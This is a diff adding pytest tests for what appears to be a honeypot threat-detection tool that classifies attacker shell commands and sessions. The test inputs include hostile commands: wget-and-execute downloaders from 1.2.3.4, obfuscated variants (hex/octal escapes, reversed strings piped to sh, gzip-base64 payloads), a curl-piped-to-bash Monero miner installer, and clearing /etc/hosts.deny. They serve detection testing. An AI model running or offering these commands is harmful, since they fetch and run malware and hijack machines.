@@ -378,3 +378,144 @@ def test_payload_event_with_url_or_hash_is_still_a_download(analyzer):
     v = analyzer.analyze_event({"event_type": "malware_download", "payload": {"url": "http://x/y", "file_hash": "ab"}})
     assert v.kind == "download" and v.threat_score >= 90
     assert analyzer.analyze_event({"type": "payload", "data": {"url": "http://x/y"}}).kind == "download"
+
+
+# ───── обучающие данные в комплекте ─────
+def test_training_data_files_are_valid():
+    import json
+    from pathlib import Path
+    from honeymind.rules import CATEGORIES
+    root = Path(__file__).resolve().parent.parent / "data" / "train"
+    for name, key in (("synthetic_corpus.jsonl", "text"), ("real_labeled.jsonl", "command")):
+        rows = [json.loads(l) for l in (root / name).read_text(encoding="utf-8").splitlines() if l.strip()]
+        assert len(rows) > 300, name
+        assert all(r[key] and r["label"] in CATEGORIES for r in rows), name
+    real = [json.loads(l)["command"] for l in (root / "real_labeled.jsonl").read_text(encoding="utf-8").splitlines() if l.strip()]
+    assert len(real) == len(set(real)), "дубли в real_labeled.jsonl"
+
+
+def test_train_uses_real_labeled_data(tmp_path):
+    import subprocess, sys
+    from pathlib import Path
+    from honeymind.model import ThreatModel
+    root = Path(__file__).resolve().parent.parent
+    out = tmp_path / "m.joblib"
+    subprocess.run([sys.executable, str(root / "train.py"), "--out", str(out)], check=True, cwd=root, capture_output=True)
+    m = ThreatModel.load(out)
+    assert m.meta["real_labeled"] > 300 and m.meta["real_weight"] >= 1
+    assert m.predict("cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh").category == "malware_downloader"
+
+
+# ───── v3: деобфускация, сегменты цепочек, новые правила ─────
+import pytest as _pytest
+
+
+@_pytest.mark.parametrize("cmd", [
+    r"$'\x77\x67\x65\x74' http://1.2.3.4/x.sh; sh x.sh",
+    r"printf '\167\147\145\164' http://1.2.3.4/x.sh",
+    "a=wg;b=et;$a$b http://1.2.3.4/x.sh; chmod +x x.sh; ./x.sh",
+    'echo "hs.x/4.3.2.1//:ptth tegw" | rev | sh',
+    "/u?r/b?n/w?et http://1.2.3.4/x.sh -O /tmp/x; /tmp/x",
+])
+def test_new_obfuscations_are_decoded(rules_only, cmd):
+    v = rules_only.analyze_command(cmd)
+    assert v.threat_score >= 60, (cmd, v)
+
+
+def test_gzip_base64_payload_is_decoded(rules_only):
+    import base64, gzip
+    b = base64.b64encode(gzip.compress(b"wget http://1.2.3.4/x.sh; sh x.sh")).decode()
+    v = rules_only.analyze_command(f"echo {b} | base64 -d | gunzip | sh")
+    assert v.category == "malware_downloader" and v.threat_score >= 90
+
+
+def test_plain_variable_use_is_not_obfuscation():
+    from honeymind.textnorm import normalize
+    assert not normalize("PATH=/usr/bin:/bin; echo $PATH").obfuscated
+
+
+def test_split_segments_respects_quotes_and_redirects():
+    from honeymind.analyzer import split_segments
+    assert split_segments('a; b && c || d | e') == ["a", "b", "c", "d", "e"]
+    assert split_segments('echo "a;b" | sh') == ['echo "a;b"', "sh"]
+    assert split_segments("nohup ./x >/dev/null 2>&1 &") == ["nohup ./x >/dev/null 2>&1"]
+
+
+def test_dangerous_step_inside_chain_is_found(rules_only):
+    v = rules_only.analyze_command("uname -m && pkill -9 upnpsetup")
+    assert v.category == "defense_evasion"
+
+
+@_pytest.mark.parametrize("cmd,cat", [
+    ("/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA", "reconnaissance"),
+    ("tftp; wget; /bin/busybox ABCDE", "reconnaissance"),
+    ("touch ylyzc", "reconnaissance"),
+    ("/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z", "reconnaissance"),
+    ('echo "/bin/busybox ERTJJ" | sh', "reconnaissance"),
+    (">A@/XBV'8ELFGVR", "benign"),
+    ("Host: 104.238.182.124", "benign"),
+    ("User-Agent: curl/7.61.1", "benign"),
+    ("fi", "benign"),
+    ("cmd='N/A';", "benign"),
+    ("dd bs=1 count=1911588 > /tmp/cBOVQTCVl8", "malware_downloader"),
+    ("head -c 0 > /tmp/x", "reconnaissance"),
+    ("sudo ./upnpsetup", "malware_execution"),
+    ("sudo hive-passwd set abcdef", "persistence"),
+    ("nvidia-smi --list-gpus", "reconnaissance"),
+    ("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4ABC",
+     "cryptominer"),
+    ("echo > /etc/hosts.deny", "defense_evasion"),
+])
+def test_v3_rules(rules_only, cmd, cat):
+    assert rules_only.analyze_command(cmd).category == cat, cmd
+
+
+def test_comment_with_payload_is_not_whitelisted(rules_only):
+    v = rules_only.analyze_command("#!/bin/sh; wget http://1.2.3.4/x; chmod +x x; ./x")
+    assert v.threat_score >= 60
+
+
+# ───── v3: сессия ─────
+def _sev(t, c=None, ts=1000, **k):
+    return {"type": t, "command": c, "ts": ts, "session_id": k.get("sid", "s1"), "src_ip": k.get("ip", "1.1.1.1"),
+            "data": k.get("data", {})}
+
+
+def test_bot_ssh_library_marks_session_as_bot():
+    from honeymind.analyzer import Analyzer
+    r = Analyzer(None).analyze_session([_sev("connect", ts=999, data={"client_version": "SSH-2.0-Go"}),
+                                        _sev("command", "cd /tmp", 1000), _sev("command", "ls", 1004),
+                                        _sev("command", "cat /etc/passwd", 1011), _sev("command", "w", 1019)])
+    assert r["is_human"] is False and r["human_method"] == "ssh_client" and r["ssh_client"] == "SSH-2.0-Go"
+
+
+def test_openssh_client_is_not_a_bot_signal():
+    from honeymind.analyzer import Analyzer
+    r = Analyzer(None).analyze_session([_sev("connect", ts=999, data={"client_version": "SSH-2.0-OpenSSH_9.6"}),
+                                        _sev("command", "ls", 1000)])
+    assert r["human_method"] != "ssh_client"
+
+
+def test_download_then_execute_across_commands():
+    from honeymind.analyzer import Analyzer
+    an = Analyzer(None)
+    r = an.analyze_session([_sev("command", "cd /tmp; wget http://1.2.3.4/bot.x86 -O bot", 1000),
+                            _sev("command", "ls -la", 1003), _sev("command", "./bot", 1006)])
+    assert r["download_then_execute"] and r["threat_score"] >= 95
+    assert an.analyze_session([_sev("command", "cd /tmp; wget http://1.2.3.4/b -O b", 1000), _sev("command", "./b", 1004)])["download_then_execute"]
+    r = an.analyze_session([_sev("command", "wget http://1.2.3.4/a.sh", 1000), _sev("command", "cat a.sh", 1003)])
+    assert not r["download_then_execute"]
+
+
+def test_sqlite_tracker_survives_restart(tmp_path):
+    from honeymind.adapter import canonicalize
+    from honeymind.humanness import SqliteScriptTracker
+    db = str(tmp_path / "state.db")
+    cmds = ["uname -a", "cat /proc/cpuinfo", "free -m", "ls /tmp"]
+    sess = lambda sid, ip: [canonicalize({"type": "command", "command": c, "ts": 1000 + i, "session_id": sid,
+                                          "src_ip": ip}) for i, c in enumerate(cmds)]
+    t = SqliteScriptTracker(db)
+    assert t.observe(sess("a", "1.1.1.1")) == (0, 0)
+    assert t.observe(sess("b", "2.2.2.2")) == (1, 1)
+    assert t.observe(sess("b", "2.2.2.2")) == (1, 1)          # повтор той же сессии не считается
+    assert SqliteScriptTracker(db).observe(sess("c", "3.3.3.3")) == (2, 2)
